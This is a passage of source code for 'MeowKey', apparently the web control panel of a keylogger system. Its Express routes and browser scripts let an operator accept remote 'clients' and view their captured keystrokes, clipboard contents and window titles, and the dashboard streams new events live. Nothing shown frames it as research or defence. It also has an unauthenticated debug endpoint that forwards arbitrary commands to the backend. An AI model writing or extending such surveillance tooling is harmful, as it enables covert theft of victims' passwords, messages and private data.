    } catch (error) {
        console.error('Error getting clients list:', error);
        res.status(500).json({ 
            success: false, 
            error: error.message,
            pending: [],
            active: [],
            message: 'Failed to get clients list'
        });
    }
});

// Get all registered clients from database
app.get('/api/clients/all', async (req, res) => {
    try {
        console.log('ðŸ“‹ Getting all clients...');
        const response = await sendToAPI('clients');
        console.log('All clients response:', response);
        
        const parsed = parseCommandOutput('clients', response.data || response.raw);
        res.json({ 
            success: true, 
            ...parsed,
            message: `Found ${parsed.allClients?.length || 0} registered clients`
        });
    } catch (error) {
        console.error('Error getting all clients:', error);
        res.status(500).json({ 
            success: false, 
            error: error.message,
            allClients: [],
            message: 'Failed to get all clients'
        });
    }
});

/// Fix the view client data endpoint
app.get('/api/clients/:id/data', async (req, res) => {
    try {
        const clientId = req.params.id;
        const type = req.query.type || 'all';
        
        console.log(`ðŸ“„ Getting ${type} data for client ${clientId}`);
        
        // Map frontend types to C++ API types
        const typeMap = {
            'all': 'all',
            'ks': 'all',
            'keystrokes': 'all',
            'clip': 'all',
            'clipboard': 'all',
            'win': 'all',
            'windows': 'all'
        };
        
        // Always request 'all' from C++ API
        const response = await sendToAPI('view', { 
            client_id: clientId, 
            type: 'all'  // Always get all data
        });
        
        console.log(`View response for ${clientId} (${type}):`, response);
        
        // Parse the response
        const parsed = parseCommandOutput('view', response.data || response.raw);
        
        // Filter data based on requested type
        let filteredData = { ...parsed };
        
        if (type === 'keystrokes' || type === 'ks') {
            filteredData.clipboard = [];
            filteredData.windows = [];
        } else if (type === 'clipboard' || type === 'clip') {
            filteredData.keystrokes = [];
            filteredData.windows = [];
        } else if (type === 'windows' || type === 'win') {
            filteredData.keystrokes = [];
            filteredData.clipboard = [];
        }
        
        // Add counts
        filteredData.keystrokeCount = filteredData.keystrokes?.length || 0;
        filteredData.clipboardCount = filteredData.clipboard?.length || 0;
        filteredData.windowCount = filteredData.windows?.length || 0;
        filteredData.totalCount = filteredData.keystrokeCount + filteredData.clipboardCount + filteredData.windowCount;
        
        res.json({ 
            success: true, 
            ...filteredData,
            message: `Retrieved ${filteredData.totalCount} ${type} events for client ${clientId}`
        });
    } catch (error) {
        console.error(`Error getting ${req.query.type} data for client ${req.params.id}:`, error);
        res.status(500).json({ 
            success: false, 
            error: error.message,
            clientId: req.params.id,
            keystrokes: [],
            clipboard: [],
            windows: [],
            keystrokeCount: 0,
            clipboardCount: 0,
            windowCount: 0,
            totalCount: 0,
            message: `Failed to get ${req.query.type} data for client ${req.params.id}`
        });
    }
});

// Accept a pending client
app.post('/api/clients/:id/accept', async (req, res) => {
    try {
        const clientId = req.params.id;
        console.log(`âœ… Accepting client: ${clientId}`);
        
        const response = await sendToAPI('accept', { client_id: clientId });
        res.json({ 
            success: true, 
            ...response,
            message: `Client ${clientId} accepted successfully`
        });
    } catch (error) {
        console.error(`Error accepting client ${req.params.id}:`, error);
        res.status(500).json({ 
            success: false, 
            error: error.message,
            message: `Failed to accept client ${req.params.id}`
        });
    }
});

// Reject a pending client
app.post('/api/clients/:id/reject', async (req, res) => {
    try {
        const clientId = req.params.id;
        console.log(`âŒ Rejecting client: ${clientId}`);
        
        const response = await sendToAPI('reject', { client_id: clientId });
        res.json({ 
            success: true, 
            ...response,
            message: `Client ${clientId} rejected successfully`
        });
    } catch (error) {
        console.error(`Error rejecting client ${req.params.id}:`, error);
        res.status(500).json({ 
            success: false, 
            error: error.message,
            message: `Failed to reject client ${req.params.id}`
        });
    }
});

// Kick/Disconnect a client
app.post('/api/clients/:id/kick', async (req, res) => {
    try {
        const clientId = req.params.id;
        console.log(`ðŸ‘¢ Kicking client: ${clientId}`);
        
        const response = await sendToAPI('kick', { client_id: clientId });
        res.json({ 
            success: true, 
            ...response,
            message: `Client ${clientId} kicked successfully`
        });
    } catch (error) {
        console.error(`Error kicking client ${req.params.id}:`, error);
        res.status(500).json({ 
            success: false, 
            error: error.message,
            message: `Failed to kick client ${req.params.id}`
        });
    }
});

// Delete a client and all their data
app.delete('/api/clients/:id', async (req, res) => {
    try {
        const clientId = req.params.id;
        console.log(`ðŸ—‘ï¸  Deleting client: ${clientId}`);
        
        const response = await sendToAPI('delete', { client_id: clientId });
        res.json({ 
            success: true, 
            ...response,
            message: `Client ${clientId} deleted successfully`
        });
    } catch (error) {
        console.error(`Error deleting client ${req.params.id}:`, error);
        res.status(500).json({ 
            success: false, 
            error: error.message,
            message: `Failed to delete client ${req.params.id}`
        });
    }
});

// Get database statistics
app.get('/api/stats', async (req, res) => {
    try {
        console.log('ðŸ“Š Getting database stats...');
        const response = await sendToAPI('stats');
        console.log('Stats response:', response);
        
        const parsed = parseCommandOutput('stats', response.data || response.raw);
        res.json({ 
            success: true, 
            ...parsed,
            message: 'Database statistics retrieved'
        });
    } catch (error) {
        console.error('Error getting stats:', error);
        res.status(500).json({ 
            success: false, 
            error: error.message,
            fileSize: '0 MB',
            usedSpace: '0 MB',
            usage: '0%',
            totalClients: 0,
            cachedClients: 0,
            freeNodes: 0,
            freeBlocks: 0,
            message: 'Failed to get database statistics'
        });
    }
});

// Flush database to disk
app.post('/api/database/flush', async (req, res) => {
    try {
        console.log('ðŸ’¾ Flushing database to disk...');
        const response = await sendToAPI('flush');
        res.json({ 
            success: true, 
            ...response,
            message: 'Database flushed to disk successfully'
        });
    } catch (error) {
        console.error('Error flushing database:', error);
        res.status(500).json({ 
            success: false, 
            error: error.message,
            message: 'Failed to flush database'
        });
    }
});

// View client data
app.get('/api/clients/:id/data', async (req, res) => {
    try {
        const clientId = req.params.id;
        const type = req.query.type || 'all';
        
        console.log(`ðŸ“„ Getting data for client ${clientId}, type: ${type}`);
        
        const response = await sendToAPI('view', { 
            client_id: clientId, 
            type: type 
        });
        
        console.log(`View response for ${clientId}:`, response);
        
        const parsed = parseCommandOutput('view', response.data || response.raw);
        
        // Add counts
        parsed.keystrokeCount = parsed.keystrokes?.length || 0;
        parsed.clipboardCount = parsed.clipboard?.length || 0;
        parsed.windowCount = parsed.windows?.length || 0;
        parsed.totalCount = parsed.keystrokeCount + parsed.clipboardCount + parsed.windowCount;
        
        res.json({ 
            success: true, 
            ...parsed,
            message: `Retrieved ${parsed.totalCount} events for client ${clientId}`
        });
    } catch (error) {
        console.error(`Error getting data for client ${req.params.id}:`, error);
        res.status(500).json({ 
            success: false, 
            error: error.message,
            clientId: req.params.id,
            keystrokes: [],
            clipboard: [],
            windows: [],
            keystrokeCount: 0,
            clipboardCount: 0,
            windowCount: 0,
            totalCount: 0,
            message: `Failed to get data for client ${req.params.id}`
        });
    }
});

// Get server status
app.get('/api/server/status', async (req, res) => {
    try {
        const response = await sendToAPI('ping');
        
        res.json({ 
            success: true,
            running: true,
            port: 8080,
            apiPort: API_PORT,
            apiHost: API_HOST,
            apiConnected: true,
            status: 'connected',
            message: 'Server is running and connected to C++ API',
            response: response
        });
    } catch (error) {
        res.json({ 
            success: true, // Still true because UI server is running
            running: true,
            port: 8080,
            apiPort: API_PORT,
            apiHost: API_HOST,
            apiConnected: false,
            status: 'disconnected',
            error: error.message,
            message: 'UI server is running but cannot connect to C++ API'
        });
    }
});

// Get dashboard summary
app.get('/api/dashboard/summary', async (req, res) => {
    try {
        console.log('ðŸ“ˆ Getting dashboard summary...');
        
        // Get all data needed for dashboard
        const [listResponse, statsResponse, allClientsResponse] = await Promise.all([
            sendToAPI('list').catch(err => {
                console.error('Error getting list:', err);
                return { data: [] };
            }),
            sendToAPI('stats').catch(err => {
                console.error('Error getting stats:', err);
                return { data: [] };
            }),
            sendToAPI('clients').catch(err => {
                console.error('Error getting all clients:', err);
                return { data: [] };
            })
        ]);
        
        const listData = parseCommandOutput('list', listResponse.data || listResponse.raw);
        const statsData = parseCommandOutput('stats', statsResponse.data || statsResponse.raw);
        const allClientsData = parseCommandOutput('clients', allClientsResponse.data || allClientsResponse.raw);
        
        res.json({
            success: true,
            activeClients: listData.active || [],
            pendingClients: listData.pending || [],
            totalClients: statsData.totalClients || allClientsData.allClients?.length || 0,
            databaseSize: statsData.fileSize || '0 MB',
            usedSpace: statsData.usedSpace || '0 MB',
            usage: statsData.usage || '0%',
            apiConnected: true,
            message: `Dashboard summary: ${listData.active?.length || 0} active, ${listData.pending?.length || 0} pending, ${statsData.totalClients || 0} total clients`
        });
    } catch (error) {
        console.error('Error getting dashboard summary:', error);
        res.status(500).json({
            success: false,
            error: error.message,
            activeClients: [],
            pendingClients: [],
            totalClients: 0,
            databaseSize: '0 MB',
            usedSpace: '0 MB',
            usage: '0%',
            apiConnected: false,
            message: 'Failed to get dashboard summary'
        });
    }
});

// Get database file info (for settings page)
app.get('/api/database/info', async (req, res) => {
    try {
        console.log('ðŸ—„ï¸  Getting database file info...');
        
        // Check if database file exists
        const dbPath = path.join(__dirname, '..', '..', DB_PATH);
        console.log('Database path:', dbPath);
        
        const dbExists = fs.existsSync(dbPath);
        
        let fileStats = {};
        if (dbExists) {
            const stats = fs.statSync(dbPath);
            fileStats = {
                exists: true,
                size: stats.size,
                sizeMB: (stats.size / (1024 * 1024)).toFixed(2) + ' MB',
                modified: stats.mtime,
                created: stats.birthtime || stats.ctime
            };
        } else {
            fileStats = {
                exists: false,
                size: 0,
                sizeMB: '0 MB',
                modified: null,
                created: null
            };
        }
        
        // Also get stats from C++ API
        let serverStats = null;
        try {
            const statsResponse = await sendToAPI('stats');
            serverStats = parseCommandOutput('stats', statsResponse.data || statsResponse.raw);
        } catch (apiError) {
            console.error('Error getting API stats:', apiError);
            serverStats = null;
        }
        
        res.json({
            success: true,
            file: fileStats,
            serverStats: serverStats,
            message: `Database file ${dbExists ? 'exists' : 'not found'} at ${dbPath}`
        });
    } catch (error) {
        console.error('Error getting database info:', error);
        res.status(500).json({
            success: false,
            error: error.message,
            file: { exists: false, sizeMB: '0 MB' },
            serverStats: null,
            message: 'Failed to get database information'
        });
    }
});

// Stop server
app.post('/api/server/stop', async (req, res) => {
    try {
        console.log('ðŸ›‘ Stopping server...');
        
        // For now, just send quit command without auth (add auth in production)
        const response = await sendToAPI('quit');
        res.json({ 
            success: true, 
            ...response,
            message: 'Server stop command sent'
        });
    } catch (error) {
        console.error('Error stopping server:', error);
        res.status(500).json({ 
            success: false, 
            error: error.message,
            message: 'Failed to stop server'
        });
    }
});

// Test direct command endpoint (for debugging)
app.post('/api/debug/command', async (req, res) => {
    try {
        const { command } = req.body;
        console.log(`ðŸ”§ Debug command: ${command}`);
        
        const response = await sendToAPI(command);
        res.json({
            success: true,
            command: command,
            response: response,
            message: `Command '${command}' executed`
        });
    } catch (error) {
        console.error('Debug command error:', error);
        res.status(500).json({
            success: false,
            error: error.message,
            command: req.body.command,
            message: 'Debug command failed'
        });
    }
});

// Error handling middleware
app.use((err, req, res, next) => {
    console.error('Server error:', err);
    res.status(500).json({
        success: false,
        error: 'Internal server error',
        message: err.message,
        stack: process.env.NODE_ENV === 'development' ? err.stack : undefined
    });
});

// 404 handler
app.use((req, res) => {
    console.log(`404: ${req.method} ${req.path}`);
    res.status(404).json({
        success: false,
        error: 'Endpoint not found',
        path: req.path,
        message: `No endpoint found at ${req.path}`
    });
});

// Start server
server.listen(UI_PORT, '0.0.0.0', async () => {
    console.log(`\nðŸš€ MeowKey Web UI Server`);
    console.log(`   URL: http://localhost:${UI_PORT}`);
    console.log(`   C++ API: ${API_HOST}:${API_PORT}`);
    console.log(`   Database: ${path.join(__dirname, '..', '..', DB_PATH)}`);
    
    console.log(`\nðŸ“Š Available Pages:`);
    console.log(`   http://localhost:${UI_PORT}/index.html          - Dashboard`);
    console.log(`   http://localhost:${UI_PORT}/waiting_room.html   - Waiting Room`);
    console.log(`   http://localhost:${UI_PORT}/clients.html        - Client Management`);
    console.log(`   http://localhost:${UI_PORT}/settings.html       - Settings`);
    
    console.log(`\nðŸ“‹ API Status:`);
    console.log(`   http://localhost:${UI_PORT}/api/health          - Health Check`);
    console.log(`   http://localhost:${UI_PORT}/api/dashboard/summary - Dashboard Data`);
    console.log(`   http://localhost:${UI_PORT}/api/clients/list    - Active/Pending Clients`);
    console.log(`   http://localhost:${UI_PORT}/api/clients/all     - All Registered Clients`);
    
    // Test API connection on startup
    console.log('\nðŸ”Œ Testing C++ API connection...');
    await testAPIConnection();
    
    // Periodic connection check every 30 seconds
    setInterval(async () => {
        if (!apiConnected) {
            console.log('ðŸ”„ Attempting to reconnect to C++ API...');
            await testAPIConnection();
        }
    }, 30000);
    
    // Initial data fetch test
    setTimeout(async () => {
        if (apiConnected) {
            console.log('\nðŸ§ª Testing data fetch...');
            try {
                const testResponse = await sendToAPI('ping').catch(() => null);
                if (testResponse) {
                    console.log('âœ… Initial connection test successful');
                }
            } catch (err) {
                console.log('âš ï¸  Initial connection test failed');
            }
        }
    }, 1000);
});

// Graceful shutdown
process.on('SIGINT', () => {
    console.log('\nðŸ›‘ Received SIGINT, shutting down...');
    console.log('Closing HTTP server...');
    
    server.close(() => {
        console.log('âœ… HTTP server closed');
        console.log('âœ… UI server shutdown complete');
        process.exit(0);
    });
    
    // Force close after 5 seconds
    setTimeout(() => {
        console.log('âš ï¸  Forcing shutdown...');
        process.exit(1);
    }, 5000);
});

process.on('SIGTERM', () => {
    console.log('\nðŸ”» Received SIGTERM, shutting down...');
    server.close(() => {
        console.log('âœ… Server closed gracefully');
        process.exit(0);
    });
});

// Handle uncaught exceptions
process.on('uncaughtException', (err) => {
    console.error('Uncaught Exception:', err);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('Unhandled Rejection at:', promise, 'reason:', reason);
});

===== FILE: ./UI/js/main.js =====


class MeowKeyApp {
    constructor() {
        this.currentPage = this.getCurrentPage();
        this.selectedClientId = null;
        this.init();
    }

    getCurrentPage() {
        const path = window.location.pathname;
        if (path.includes('index.html') || path === '/') return 'dashboard';
        if (path.includes('waiting_room.html')) return 'waiting_room';
        if (path.includes('clients.html')) return 'clients';
        if (path.includes('settings.html')) return 'settings';
        return 'dashboard';
    }

    init() {
        this.setupPageSpecificFunctions();
        this.setupGlobalEventListeners();
        this.loadPageData();
    }

    setupPageSpecificFunctions() {
        switch (this.currentPage) {
            case 'waiting_room':
                this.setupWaitingRoom();
                break;
            case 'clients':
                this.setupClientsPage();
                break;
            case 'settings':
                this.setupSettingsPage();
                break;
        }
    }

    setupGlobalEventListeners() {
        // Refresh buttons
        document.querySelectorAll('[id*="refresh"], [id*="Refresh"]').forEach(btn => {
            btn.addEventListener('click', () => {
                this.loadPageData();
                window.utils.showNotification('Refreshing data...', 'info');
            });
        });
    }

    async loadPageData() {
        try {
            switch (this.currentPage) {
                case 'waiting_room':
                    await this.loadWaitingRoomData();
                    break;
                case 'clients':
                    await this.loadClientsData();
                    break;
                case 'settings':
                    await this.loadSettingsData();
                    break;
            }
        } catch (error) {
            console.error('Failed to load page data:', error);
            window.utils.showNotification('Failed to load data', 'error');
        }
    }

    // WAITING ROOM PAGE
    setupWaitingRoom() {
        document.addEventListener('click', (e) => {
            const acceptBtn = e.target.closest('.btn-success');
            const rejectBtn = e.target.closest('.btn-danger');
            
            if (acceptBtn && acceptBtn.dataset.clientId) {
                e.preventDefault();
                const clientId = acceptBtn.dataset.clientId;
                this.acceptClient(clientId);
            } else if (rejectBtn && rejectBtn.dataset.clientId) {
                e.preventDefault();
                const clientId = rejectBtn.dataset.clientId;
                this.rejectClient(clientId);
            }
        });
    }

    async loadWaitingRoomData() {
        try {
            const response = await window.utils.apiCall('/api/clients/list');
            if (response.success && response.pending) {
                this.renderPendingClients(response.pending);
                this.updateWaitingRoomStats(response.pending.length);
            } else {
                this.showEmptyState('pending-clients-container', 'No pending clients', 'Client connection requests will appear here');
            }
        } catch (error) {
            console.error('Failed to load waiting room data:', error);
            this.showEmptyState('pending-clients-container', 'No pending clients', 'Client connection requests will appear here');
        }
    }

    renderPendingClients(clients) {
        const container = document.getElementById('pending-clients-container');
        if (!container) return;

        if (!clients || clients.length === 0) {
            this.showEmptyState('pending-clients-container', 'No Pending Clients', 'All client requests have been processed');
            return;
        }

        container.innerHTML = '';
        clients.forEach(client => {
            const pendingClient = document.createElement('div');
            pendingClient.className = 'pending-client';
            pendingClient.innerHTML = `
                <div class="pending-info">
                    <h4>${client.id}</h4>
                    <p>Status: ${client.status}</p>
                </div>
                <div class="pending-actions">
                    <button class="btn-success" data-client-id="${client.id}">
                        <i class="fas fa-check"></i> Accept
                    </button>
                    <button class="btn-danger" data-client-id="${client.id}">
                        <i class="fas fa-times"></i> Reject
                    </button>
                </div>
            `;
            container.appendChild(pendingClient);
        });
    }

    updateWaitingRoomStats(pendingCount) {
        const pendingElement = document.getElementById('pending-count');
        const approvedElement = document.getElementById('approved-today');
        const rejectedElement = document.getElementById('rejected-today');
        
        if (pendingElement) pendingElement.textContent = pendingCount || 0;
        if (approvedElement) approvedElement.textContent = 0; // Would need to track this
        if (rejectedElement) rejectedElement.textContent = 0; // Would need to track this
    }

    async acceptClient(clientId) {
        if (!confirm(`Accept client ${clientId}?`)) return;
        
        try {
            const response = await window.utils.apiCall(`/api/clients/${clientId}/accept`, 'POST');
            if (response.success) {
                window.utils.showNotification(`Client ${clientId} accepted`, 'success');
                this.removePendingClient(clientId);
                this.loadWaitingRoomData(); // Refresh the list
            }
        } catch (error) {
            window.utils.showNotification(`Failed to accept client: ${error.message}`, 'error');
        }
    }

    async rejectClient(clientId) {
        if (!confirm(`Reject client ${clientId}?`)) return;
        
        try {
            const response = await window.utils.apiCall(`/api/clients/${clientId}/reject`, 'POST');
            if (response.success) {
                window.utils.showNotification(`Client ${clientId} rejected`, 'success');
                this.removePendingClient(clientId);
                this.loadWaitingRoomData(); // Refresh the list
            }
        } catch (error) {
            window.utils.showNotification(`Failed to reject client: ${error.message}`, 'error');
        }
    }

    removePendingClient(clientId) {
        const container = document.getElementById('pending-clients-container');
        if (!container) return;

        const clientElement = container.querySelector(`[data-client-id="${clientId}"]`);
        if (clientElement) {
            clientElement.closest('.pending-client').remove();
        }

        if (container.children.length === 0) {
            this.showEmptyState('pending-clients-container', 'No Pending Clients', 'All client requests have been processed');
        }
    }

    // CLIENTS PAGE
    setupClientsPage() {
        const refreshBtn = document.getElementById('refresh-clients');
        if (refreshBtn) {
            refreshBtn.addEventListener('click', () => {
                this.loadClientsData();
                window.utils.showNotification('Refreshing clients list...', 'info');
            });
        }

        // Event delegation for view buttons
        document.addEventListener('click', (e) => {
            const viewBtn = e.target.closest('.view-client-btn');
            const deleteBtn = e.target.closest('.btn-danger[data-client-id]');
            
            if (viewBtn && viewBtn.dataset.clientId) {
                e.preventDefault();
                const clientId = viewBtn.dataset.clientId;
                this.showClientDetails(clientId);
            } else if (deleteBtn && deleteBtn.dataset.clientId) {
                e.preventDefault();
                const clientId = deleteBtn.dataset.clientId;
                this.deleteClient(clientId);
            }
        });

        // Modal close buttons
        const closeDetailsBtn = document.getElementById('close-details-modal');
        if (closeDetailsBtn) {
            closeDetailsBtn.addEventListener('click', () => {
                window.utils.hideModal('client-details-modal');
            });
        }

        // Client details modal buttons
        const viewDataBtn = document.getElementById('view-client-data');
        const deleteDataBtn = document.getElementById('delete-client-data');
        const kickClientBtn = document.getElementById('kick-client');
        
        if (viewDataBtn) {
            viewDataBtn.addEventListener('click', () => {
                if (this.selectedClientId) {
                    this.viewClientData(this.selectedClientId);
                }
            });
        }
        
        if (deleteDataBtn) {
            deleteDataBtn.addEventListener('click', () => {
                if (this.selectedClientId && confirm(`Delete all data for ${this.selectedClientId}?`)) {
                    this.deleteClient(this.selectedClientId);
                    window.utils.hideModal('client-details-modal');
                }
            });
        }
        
        if (kickClientBtn) {
            kickClientBtn.addEventListener('click', () => {
                if (this.selectedClientId && confirm(`Kick client ${this.selectedClientId}?`)) {
                    this.kickClient(this.selectedClientId);
                    window.utils.hideModal('client-details-modal');
                }
            });
        }
    }

    async loadClientsData() {
        try {
            const response = await window.utils.apiCall('/api/clients/all');
            if (response.success && response.allClients) {
                this.renderClientsTable(response.allClients);
                this.updateClientsStats(response.allClients);
            } else {
                this.showEmptyState('clients-table', 'No Clients Found', 'No clients have registered with the server yet');
            }
        } catch (error) {
            console.error('Failed to load clients data:', error);
            this.showEmptyState('clients-table', 'No Clients Found', 'No clients have registered with the server yet');
        }
    }

    renderClientsTable(clients) {
        const container = document.getElementById('clients-table');
        if (!container) return;

        if (!clients || clients.length === 0) {
            this.showEmptyState('clients-table', 'No Clients Found', 'No clients have registered with the server yet');
            return;
        }

        container.innerHTML = '';
        clients.forEach(client => {
            const row = document.createElement('div');
            row.className = 'pending-client';
            row.innerHTML = `
                <div style="display: grid; grid-template-columns: 2fr 1fr 1fr 1fr 1fr; gap: 1rem; width: 100%; align-items: center;">
                    <span style="font-weight: 500;">${client.id}</span>
                    <span>
                        <span class="connection-dot" 
                              style="display: inline-block; margin-right: 0.5rem; background: #34a853;"></span>
                        Registered
                    </span>
                    <span>${client.sessions || 0}</span>
                    <span>${client.lastSeen ? window.utils.formatTimestamp(client.lastSeen) : 'Never'}</span>
                    <div>
                        <button class="btn-secondary view-client-btn" 
                                data-client-id="${client.id}" 
                                style="padding: 0.25rem 0.5rem; font-size: 0.75rem;">
                            <i class="fas fa-eye"></i> View
                        </button>
                        <button class="btn-danger" 
                                data-client-id="${client.id}"
                                style="padding: 0.25rem 0.5rem; font-size: 0.75rem; margin-left: 0.5rem;">
                            <i class="fas fa-trash"></i>
                        </button>
                    </div>
                </div>
            `;
            container.appendChild(row);
        });
    }

    updateClientsStats(clients) {
        const totalRegistered = document.getElementById('total-registered');
        const activeNow = document.getElementById('active-now');
        const inactiveClients = document.getElementById('inactive-clients');
        
        // Get active clients
        this.getActiveClients().then(activeClients => {
            if (totalRegistered) totalRegistered.textContent = clients.length || 0;
            if (activeNow) activeNow.textContent = activeClients.length || 0;
            if (inactiveClients) inactiveClients.textContent = Math.max(0, clients.length - activeClients.length);
        }).catch(() => {
            if (totalRegistered) totalRegistered.textContent = clients.length || 0;
            if (activeNow) activeNow.textContent = '?';
            if (inactiveClients) inactiveClients.textContent = '?';
        });
    }

    async getActiveClients() {
        try {
            const response = await window.utils.apiCall('/api/clients/list');
            return response.success ? response.active || [] : [];
        } catch (error) {
            return [];
        }
    }

    async showClientDetails(clientId) {
        try {
            this.selectedClientId = clientId;
            
            // Get client details from all clients list
            const response = await window.utils.apiCall('/api/clients/all');
            if (response.success && response.allClients) {
                const client = response.allClients.find(c => c.id === clientId);
                
                if (client) {
                    document.getElementById('client-details-title').textContent = `Client: ${client.id}`;
                    document.getElementById('detail-client-id').textContent = client.id;
                    document.getElementById('detail-client-hash').textContent = '0x' + this.hashString(client.id).toString(16).substring(0, 8);
                    document.getElementById('detail-first-seen').textContent = 'Unknown'; // Would need to track this
                    document.getElementById('detail-last-seen').textContent = client.lastSeen ? window.utils.formatTimestamp(client.lastSeen) : 'Never';
                    document.getElementById('detail-session-count').textContent = client.sessions || 0;
                    document.getElementById('detail-keystrokes').textContent = client.keystrokes || 0;
                    document.getElementById('detail-clipboard').textContent = client.clipboard || 0;
                    document.getElementById('detail-windows').textContent = client.windows || 0;
                    
                    window.utils.showModal('client-details-modal');
                }
            }
        } catch (error) {
            console.error('Failed to load client details:', error);
            window.utils.showNotification('Failed to load client details', 'error');
        }
    }

    async viewClientData(clientId) {
        try {
            const response = await window.utils.apiCall(`/api/clients/${clientId}/data`);
            if (response.success) {
                // Show data in a modal or new page
                window.utils.showNotification(`Viewing data for ${clientId}`, 'info');
                console.log('Client data:', response);
                // You can implement a detailed view modal here
            }
        } catch (error) {
            window.utils.showNotification(`Failed to view client data: ${error.message}`, 'error');
        }
    }

    async kickClient(clientId) {
        try {
            const response = await window.utils.apiCall(`/api/clients/${clientId}/kick`, 'POST');
            if (response.success) {
                window.utils.showNotification(`Client ${clientId} kicked`, 'success');
                this.loadClientsData(); // Refresh the list
            }
        } catch (error) {
            window.utils.showNotification(`Failed to kick client: ${error.message}`, 'error');
        }
    }

    async deleteClient(clientId) {
        try {
            const response = await window.utils.apiCall(`/api/clients/${clientId}`, 'DELETE');
            if (response.success) {
                window.utils.showNotification(`Client ${clientId} deleted`, 'success');
                this.loadClientsData(); // Refresh the list
            }
        } catch (error) {
            window.utils.showNotification(`Failed to delete client: ${error.message}`, 'error');
        }
    }

    // SETTINGS PAGE
    setupSettingsPage() {
        const flushBtn = document.getElementById('flush-database');
        if (flushBtn) {
            flushBtn.addEventListener('click', () => {
                this.flushDatabase();
            });
        }

        const stopBtn = document.getElementById('stop-server');
        if (stopBtn) {
            stopBtn.addEventListener('click', () => {
                window.utils.showModal('quit-modal');
            });
        }

        const cancelQuitBtn = document.getElementById('cancel-quit');
        const confirmQuitBtn = document.getElementById('confirm-quit');
        const closeQuitBtn = document.getElementById('close-quit-modal');
        
        if (cancelQuitBtn) {
            cancelQuitBtn.addEventListener('click', () => {
                window.utils.hideModal('quit-modal');
                document.getElementById('admin-password').value = '';
            });
        }
        
        if (confirmQuitBtn) {
            confirmQuitBtn.addEventListener('click', () => {
                this.confirmQuit();
            });
        }
        
        if (closeQuitBtn) {
            closeQuitBtn.addEventListener('click', () => {
                window.utils.hideModal('quit-modal');
                document.getElementById('admin-password').value = '';
            });
        }
    }

    async loadSettingsData() {
        try {
            const response = await window.utils.apiCall('/api/stats');
            if (response.success) {
                this.updateSettingsStats(response);
            }
        } catch (error) {
            console.error('Failed to load settings data:', error);
        }
    }

    updateSettingsStats(stats) {
        // Update all stat elements
        const elements = {
            'uptime': 'uptime',
            'database-size': 'fileSize',
            'total-events': 'totalEvents',
            'db-file-size': 'fileSize',
            'db-used-space': 'usedSpace',
            'db-total-clients': 'totalClients',
            'db-cached-clients': 'cachedClients',
            'db-free-nodes': 'freeNodes',
            'db-free-blocks': 'freeBlocks'
        };
        
        for (const [elementId, statKey] of Object.entries(elements)) {
            const element = document.getElementById(elementId);
            if (element) {
                element.textContent = stats[statKey] || '0';
            }
        }
    }

    async flushDatabase() {
        if (!confirm('Flush database to disk? This will save all pending data.')) return;
        
        try {
            const response = await window.utils.apiCall('/api/database/flush', 'POST');
            if (response.success) {
                window.utils.showNotification('Database flushed successfully', 'success');
            }
        } catch (error) {
            window.utils.showNotification(`Failed to flush database: ${error.message}`, 'error');
        }
    }

    async confirmQuit() {
        const password = document.getElementById('admin-password').value;
        
        if (!password) {
            window.utils.showNotification('Please enter password', 'error');
            return;
        }

        // Note: The quit command would need to be implemented in the API
        window.utils.showNotification('Server stop command sent (not implemented)', 'info');
        window.utils.hideModal('quit-modal');
        document.getElementById('admin-password').value = '';
    }

    // UTILITY METHODS
    hashString(str) {
        let hash = 0;
        for (let i = 0; i < str.length; i++) {
            const char = str.charCodeAt(i);
            hash = ((hash << 5) - hash) + char;
            hash = hash & hash;
        }
        return Math.abs(hash);
    }

    showEmptyState(containerId, title, message) {
        const container = document.getElementById(containerId);
        if (!container) return;
        
        container.innerHTML = `
            <div class="empty-state">
                <i class="fas fa-inbox"></i>
                <h3>${title}</h3>
                <p>${message}</p>
            </div>
        `;
    }
}

// Initialize app
document.addEventListener('DOMContentLoaded', () => {
    window.meowKeyApp = new MeowKeyApp();
});


       

===== FILE: ./UI/js/dashboard.js =====


// UI/js/dashboard.js - COMPLETE IMPLEMENTED VERSION WITH LIVE STREAMING
class Dashboard {
    constructor() {
        this.activeClients = new Map(); // clientId -> {client, keystrokes[], clipboard[], windows[]}
        this.maxKeystrokes = 100; // Increased for live stream
        this.maxClipboard = 10;
        this.maxWindows = 10;
        this.refreshInterval = 2000; // 2 seconds for faster updates
        this.autoRefresh = null;
        this.liveUpdateInterval = 500; // 500ms for checking new events
        this.liveUpdates = null;
        this.utils = window.utils || new Utils();
        this.lastEventTimestamps = new Map(); // clientId -> {lastKeystroke, lastClipboard, lastWindow}
        this.pendingLiveEvents = new Map(); // clientId -> {keystrokes: [], clipboard: [], windows: []}
    }

    // Initialize dashboard
    init() {
        console.log('ðŸš€ Dashboard initializing with LIVE streaming...');
        this.setupEventListeners();
        this.setupClipboardModal();
        this.loadInitialData();
        this.startAutoRefresh();
        this.startLiveUpdates();
        this.setupQuerySection();
        console.log('âœ… Dashboard initialized with live streaming');
    }

    // Setup event listeners
    setupEventListeners() {
        // Copy clipboard button
        const copyBtn = document.getElementById('copy-clipboard');
        if (copyBtn) {
            copyBtn.addEventListener('click', () => {
                const content = document.getElementById('clipboard-content').textContent;
                navigator.clipboard.writeText(content)
                    .then(() => this.utils.showNotification('Copied to clipboard', 'success'))
                    .catch(err => {
                        console.error('Failed to copy:', err);
                        this.utils.showNotification('Failed to copy to clipboard', 'error');
                    });
            });
        }

        // Close modal button
        const closeBtn = document.getElementById('close-modal');
        if (closeBtn) {
            closeBtn.addEventListener('click', () => {
                this.utils.hideModal('clipboard-modal');
            });
        }

        // Modal background click
        const modal = document.getElementById('clipboard-modal');
        if (modal) {
            modal.addEventListener('click', (e) => {
                if (e.target === modal) {
                    this.utils.hideModal('clipboard-modal');
                }
            });
        }
    }

    // Setup clipboard modal
    setupClipboardModal() {
        // Already handled in setupEventListeners
    }

    // Load initial data
    async loadInitialData() {
        try {
            console.log('ðŸ“¥ Loading initial data...');
            
            // Get active and pending clients
            const listResponse = await this.utils.apiCall('/api/clients/list');
            console.log('Active clients:', listResponse);
            
            // Get all registered clients for stats
            const allClientsResponse = await this.utils.apiCall('/api/clients/all');
            console.log('All clients:', allClientsResponse);
            
            // Get database stats
            const statsResponse = await this.utils.apiCall('/api/stats');
            console.log('Database stats:', statsResponse);
            
            // Initialize last timestamps
            this.initializeLastTimestamps(allClientsResponse);
            
            // Update UI with real data
            this.updateDashboardData(listResponse, allClientsResponse, statsResponse);
            
            this.utils.showNotification('Dashboard loaded with real-time monitoring', 'success');
            
        } catch (error) {
            console.error('Failed to load initial data:', error);
